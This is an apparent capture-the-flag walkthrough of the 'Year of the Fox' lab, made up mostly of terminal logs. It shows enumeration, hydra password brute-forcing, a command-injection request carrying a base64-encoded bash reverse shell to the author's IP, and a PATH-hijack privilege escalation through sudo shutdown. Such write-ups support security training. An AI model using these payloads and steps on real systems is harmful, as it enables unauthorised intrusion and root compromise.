root@LAPTOP-U5913CMD:/home/akshay# nmap -A -T4  10.10.213.136
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-09 11:00 IST
Nmap scan report for 10.10.213.136
Host is up (0.19s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.29
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/9%OT=80%CT=1%CU=32986%PV=Y%DS=2%DC=T%G=Y%TM=5F7FF59
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)SEQ(SP=1
OS:01%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M505ST11NW6%O2=M505ST11NW6%O
OS:3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)WIN(W1=F4B3%W2=
OS:F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSN
OS:W6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX

Host script results:
|_clock-skew: mean: -19m58s, deviation: 34m37s, median: 0s
|_nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: year-of-the-fox
|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
|   Domain name: lan
|   FQDN: year-of-the-fox.lan
|_  System time: 2020-10-09T06:30:58+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-10-09T05:30:58
|_  start_date: N/A

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   150.07 ms 10.9.0.1
2   216.46 ms 10.10.213.136



enum4linux scan Results:

root@LAPTOP-U5913CMD:/home/akshay# enum4linux 10.10.213.136
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Oct  9 11:04:01 2020

 ==========================
|    Target Information    |
 ==========================
Target ........... 10.10.213.136
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =====================================================
|    Enumerating Workgroup/Domain on 10.10.213.136    |
 =====================================================
[+] Got domain/workgroup name: YEAROFTHEFOX

 =============================================
|    Nbtstat Information for 10.10.213.136    |
 =============================================
Looking up status of 10.10.213.136
        YEAR-OF-THE-FOX <00> -         B <ACTIVE>  Workstation Service
        YEAR-OF-THE-FOX <03> -         B <ACTIVE>  Messenger Service
        YEAR-OF-THE-FOX <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        YEAROFTHEFOX    <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        YEAROFTHEFOX    <1d> -         B <ACTIVE>  Master Browser
        YEAROFTHEFOX    <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ======================================
|    Session Check on 10.10.213.136    |
 ======================================
[+] Server 10.10.213.136 allows sessions using username '', password ''

 ============================================
|    Getting domain SID for 10.10.213.136    |
 ============================================
Domain Name: YEAROFTHEFOX
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 =======================================
|    OS information on 10.10.213.136    |
 =======================================
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.213.136 from smbclient:
[+] Got OS info for 10.10.213.136 from srvinfo:
        YEAR-OF-THE-FOXWk Sv PrQ Unx NT SNT year-of-the-fox server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ==============================
|    Users on 10.10.213.136    |
 ==============================
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: fox      Name: fox       Desc:

user:[fox] rid:[0x3e8]

 ==========================================
|    Share Enumeration on 10.10.213.136    |
 ==========================================

        Sharename       Type      Comment
        ---------       ----      -------
        yotf            Disk      Fox's Stuff -- keep out!
        IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.213.136
//10.10.213.136/yotf    Mapping: DENIED, Listing: N/A
//10.10.213.136/IPC$    [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 =====================================================
|    Password Policy Information for 10.10.213.136    |
 =====================================================


[+] Attaching to 10.10.213.136 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] YEAR-OF-THE-FOX
        [+] Builtin

[+] Password Info for Domain: YEAR-OF-THE-FOX

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes
        [+] Locked Account Duration: 30 minutes
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ===============================
|    Groups on 10.10.213.136    |
 ===============================

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ========================================================================
|    Users on 10.10.213.136 via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-978893743-2663913856-222388731
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-21-978893743-2663913856-222388731 and logon username '', password ''
S-1-5-21-978893743-2663913856-222388731-500 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-501 YEAR-OF-THE-FOX\nobody (Local User)
S-1-5-21-978893743-2663913856-222388731-502 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-503 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-504 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-505 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-506 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-507 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-508 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-509 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-510 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-511 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-512 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-513 YEAR-OF-THE-FOX\None (Domain Group)
S-1-5-21-978893743-2663913856-222388731-514 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-515 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-516 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-517 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-518 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-519 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-520 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-521 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-522 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-523 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-524 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-525 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-526 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-527 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-528 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-529 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-530 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-531 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-532 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-533 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-534 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-535 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-536 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-537 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-538 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-539 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-540 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-541 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-542 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-543 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-544 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-545 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-546 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-547 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-548 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-549 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-550 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1000 YEAR-OF-THE-FOX\fox (Local User)
S-1-5-21-978893743-2663913856-222388731-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\fox (Local User)
S-1-22-1-1001 Unix User\rascal (Local User)

 ==============================================
|    Getting printer info for 10.10.213.136    |
 ==============================================
No printers returned.


enum4linux complete on Fri Oct  9 11:30:08 2020

root@LAPTOP-U5913CMD:/home/akshay#


So we got two users:
-> fox
-> rascal

Lets try to bruteforce for the user rascal using rockyou.txt


We can brute the web login using the user rascal.

hydra -l rascal -P rockyou.txt 10.10.213.136 http-head /

root@LAPTOP-U5913CMD:/home/akshay# hydra -l rascal -P /home/akshay/Downloads/rockyou.txt 10.10.43.208 http-head /
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-15 11:33:24
[WARNING] http-head auth does not work with every server, better use http-get
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-head://10.10.43.208:80/
[STATUS] 2337.00 tries/min, 2337 tries in 00:01h, 14342061 to do in 102:17h, 16 active
[STATUS] 2366.67 tries/min, 7100 tries in 00:03h, 14337298 to do in 100:59h, 16 active
[80][http-head] host: 10.10.43.208   login: rascal   password: 080889
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-15 11:40:47
root@LAPTOP-U5913CMD:/home/akshay#


FInally got something after so much of enumeration.

POST /assets/php/search.php HTTP/1.1
Host: 10.10.124.127
Content-Length: 24
Authorization: Basic cmFzY2FsOmVsZW1lbnRz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.10.124.127
Referer: http://10.10.124.127/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"target":"\";ls -la\n"}

Response:
HTTP/1.1 200 OK
Date: Fri, 09 Oct 2020 06:41:56 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 73
Connection: close
Content-Type: text/html; charset=UTF-8

Lets try to insert bash reverse shell but for some reason it was filtering out some of the contents.
So I found this method to bypass this.

["-rw-r--r--","1","root","root","","650","Jun","22","00:20","search.php"]




POST /assets/php/search.php HTTP/1.1
Host: 10.10.124.127
Content-Length: 13
Authorization: Basic cmFzY2FsOmVsZW1lbnRz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.10.124.127
Referer: http://10.10.124.127/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"target":"\";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjgxLjYyLzEyMzQgMD4mMQo= | base64 -d | bash \n"}

We can filter out like this to get a reverse shell.


C:\Users\Voker\Downloads\netcat-win32-1.11\netcat-1.11>nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.9.81.62] from (UNKNOWN) [10.10.124.127] 58138
bash: cannot set terminal process group (676): Inappropriate ioctl for device
bash: no job control in this shell
www-data@year-of-the-fox:/var/www/html/assets/php$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

We got a shell nice.

www-data@year-of-the-fox:/var/www/html$ cd ..
cd ..ls

www-data@year-of-the-fox:/var/www$ ls
files
html
web-flag.txt
www-data@year-of-the-fox:/var/www$ cat web-flag.txt
cat web-flag.txt
THM{Nzg2ZWQwYWUwN2U##################}
www-data@year-of-the-fox:/var/www$

cat creds2.txt
LF5GGMCNPJIXQWLKJEZFURCJGVMVOUJQJVLVE2CONVHGUTTKNBWVUV2WNNNFOSTLJVKFS6CNKRAX
UTT2MMZE4VCVGFMXUSLYLJCGGM22KRHGUTLNIZUE26S2NMFE6R2NGBHEIY32JVBUCZ2MKFXT2CQ=
www-data@year-of-the-fox:/var/www/files$
www-data@year-of-the-fox:/tmp$ netstat -ano
netstat -ano
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      off (0.00/0/0)


www-data@year-of-the-fox:/tmp$  socat
 socat

Command 'socat' not found, but can be installed with:

apt install socat
Please ask your administrator.

www-data@year-of-the-fox:/tmp$ wget http://10.9.81.62:2222/socat
wget http://10.9.81.62:2222/socat
--2020-10-09 08:15:58--  http://10.9.81.62:2222/socat
Connecting to 10.9.81.62:2222... connected.
HTTP request sent, awaiting response... 200 OK
Length: 375176 (366K) [application/octet-stream]
Saving to: 'socat'

socat               100%[===================>] 366.38K   466KB/s    in 0.8s

2020-10-09 08:15:59 (466 KB/s) - 'socat' saved [375176/375176]

www-data@year-of-the-fox:/tmp$ chmod +x socat
chmod +x socat
www-data@year-of-the-fox:/tmp$
www-data@year-of-the-fox:/tmp$ netstat -ano
netstat -ano
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      off (0.00/0/0)

Lets forward the ssh port using socat.

www-data@year-of-the-fox:/tmp$ ./socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22
<cat tcp-listen:8888,reuseaddr,fork tcp:localhost:22

root@LAPTOP-U5913CMD:/home/akshay/Desktop/YearoftheFox# nmap -sV -p 8888 10.10.82.140
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-15 12:45 IST
Nmap scan report for 10.10.82.140
Host is up (0.15s latency).

PORT     STATE SERVICE VERSION
8888/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.97 seconds
root@LAPTOP-U5913CMD:/home/akshay/Desktop/YearoftheFox#

root@LAPTOP-U5913CMD:/home/akshay/Desktop/YearoftheFox# hydra -l fox -P /home/akshay/Downloads/rockyou.txt ssh://10.10.82.140 -s 8888
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-15 12:46:57
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.82.140:8888/

[STATUS] 181.00 tries/min, 181 tries in 00:01h, 14344222 to do in 1320:50h, 16 active
[STATUS] 167.00 tries/min, 501 tries in 00:03h, 14343902 to do in 1431:32h, 16 active
[8888][ssh] host: 10.10.82.140   login: fox   password: anderson

oot@LAPTOP-U5913CMD:/home/akshay/Desktop/YearoftheFox# ssh fox@10.10.82.140 -p 8888
The authenticity of host '[10.10.82.140]:8888 ([10.10.82.140]:8888)' can't be established.
ECDSA key fingerprint is SHA256:UUzRY8LX3i6B/7AWHKO+WY0vkPQsuyyNpEvf2BI6jMU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.82.140]:8888' (ECDSA) to the list of known hosts.
fox@10.10.82.140's password:


        __   __                       __   _   _            _____
        \ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  ___|____  __
         \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | |_ / _ \ \/ /
          | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ |  _| (_) >  <
          |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |_|  \___/_/\_\



fox@year-of-the-fox:~$ id
uid=1000(fox) gid=1000(fox) groups=1000(fox),114(sambashare)
fox@year-of-the-fox:~$ ls -al
total 36
drwxr-x--- 5 fox  fox  4096 Jun 20 02:43 .
drwxr-xr-x 4 root root 4096 May 28 21:16 ..
lrwxrwxrwx 1 fox  fox     9 May 28 21:16 .bash_history -> /dev/null
-rw-r--r-- 1 fox  fox   220 May 28 21:10 .bash_logout
-rw-r--r-- 1 fox  fox  3771 May 28 21:10 .bashrc
drwx------ 2 fox  fox  4096 May 28 21:16 .cache
drwx------ 3 fox  fox  4096 May 28 21:16 .gnupg
-rw-r--r-- 1 fox  fox   807 May 28 21:10 .profile
drwxr-xr-x 2 fox  fox  4096 Jun 20 02:08 samba
-rw-r--r-- 1 fox  fox     0 May 28 21:16 .sudo_as_admin_successful
-rw-r--r-- 1 root root   38 May 31 23:38 user-flag.txt
fox@year-of-the-fox:~$ cat user-flag.txt
THM{Njg3NWZhNDBjMm######################}
fox@year-of-the-fox:~$ cd samba
fox@year-of-the-fox:~/samba$ ls -la
total 16
drwxr-xr-x 2 fox  fox  4096 Jun 20 02:08 .
drwxr-x--- 5 fox  fox  4096 Jun 20 02:43 ..
-rw-r--r-- 1 root root  317 May 30 00:22 cipher.txt
-rw-r--r-- 1 fox  fox   317 Nov 15 06:54 creds1.txt
fox@year-of-the-fox:~/samba$ cat creds1.txt
JV5GWMSNKRGXQTTKLF5E6RCNGFGXUQL2JVVE252NPJCTETTKLF4E26TLGJHFITJQJV5FK6SNKRMT
ETTKJUZE42SNO5HGUWL2JZVFSMKONJGXUT2ELEYE26SFPIFE4VCZPBBWUTJSJZVFK6SOIRMXSTTK
LEZE4VCZPBGXUY32J5KE2NCNPJCXUTKUJUYE26SNPJHGUTL2JV5E2MSOIRMTATTKJV5E6VCZGFGX
UY32JZ5E26CNPJKTECSONJMTCTTKKF5E2ULPPJHFITJRJZVESMSNPJEXOTLKIF4VURCCNBBWOPJ5
BI======
fox@year-of-the-fox:~/samba$ cat cipher.txt
JV5FKMSNPJGTITTKKF5E46SZGJGXUVJSJZKFS6CONJCXUTTKJV4U26SBPJHUITJUJV5EC6SNPJMX
STL2MN5E6RCNGJGXUWJSJZCE2NKONJGTETLKLEZE26SBGIFE4VCZPBBWUTJUJZVEK6SNPJGXOTL2
IV5E6VCNGRHGURL2JVVFSMSNPJTTETTKJUYE26SRPJGWUTJSJZVE2MSNNJMTCTL2KUZE2VCNGBGX
USL2JZVE2M2ONJEXUCSNNJGTGTL2JEZE4ULPPJHVITLXJZVEK6SPIREXOTLKIF4VURCCNBBWOPJ5
BI======
fox@year-of-the-fox:~/samba$ sudo -l
Matching Defaults entries for fox on year-of-the-fox:
    env_reset, mail_badpass

User fox may run the following commands on year-of-the-fox:
    (root) NOPASSWD: /usr/sbin/shutdown
fox@year-of-the-fox:~/samba$ find / -perm -u=s -type f 2>/dev/null

/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/at
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/mount
/bin/fusermount
/bin/umount
/bin/ping

fox@year-of-the-fox:~/samba$
fox@year-of-the-fox:~/samba$

After getting shutdown binary, I found out that the binary calls poweroff and there's not specific rule given to it.
So we can trick that using Environment variable.

fox@year-of-the-fox:/tmp$ echo '#!/bin/bash
cp /bin/bash /tmp/bash;
chmod +s /tmp/bash
' > poweroff
fox@year-of-the-fox:/tmp$ ls -la
total 44
drwxrwxrwt 10 root root 4096 Nov 15 07:28 .
drwxr-xr-x 22 root root 4096 May 29 23:25 ..
drwxrwxrwt  2 root root 4096 Nov 15 06:54 .font-unix
drwxrwxrwt  2 root root 4096 Nov 15 06:54 .ICE-unix
-rwxr-xr-x  1 fox  fox    56 Nov 15 07:29 poweroff

fox@year-of-the-fox:/tmp$ export PATH=/tmp:$PATH
fox@year-of-the-fox:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
fox@year-of-the-fox:/tmp$ sudo -l
Matching Defaults entries for fox on year-of-the-fox:
    env_reset, mail_badpass

User fox may run the following commands on year-of-the-fox:
    (root) NOPASSWD: /usr/sbin/shutdown

fox@year-of-the-fox:/tmp$ sudo /usr/sbin/shutdown
fox@year-of-the-fox:/tmp$ ls -la
total 1132
drwxrwxrwt 10 root root    4096 Nov 15 07:29 .
drwxr-xr-x 22 root root    4096 May 29 23:25 ..
-rwsr-sr-x  1 root root 1113504 Nov 15 07:29 bash
drwxrwxrwt  2 root root    4096 Nov 15 06:54 .font-unix
drwxrwxrwt  2 root root    4096 Nov 15 06:54 .ICE-unix
-rwxr-xr-x  1 fox  fox       56 Nov 15 07:29 poweroff

fox@year-of-the-fox:/tmp$ ./bash -p
bash-4.4# id
uid=1000(fox) gid=1000(fox) euid=0(root) egid=0(root) groups=0(root),114(sambashare),1000(fox)
bash-4.4# cd /root
bash-4.4# cat root.txt
Not here -- go find!
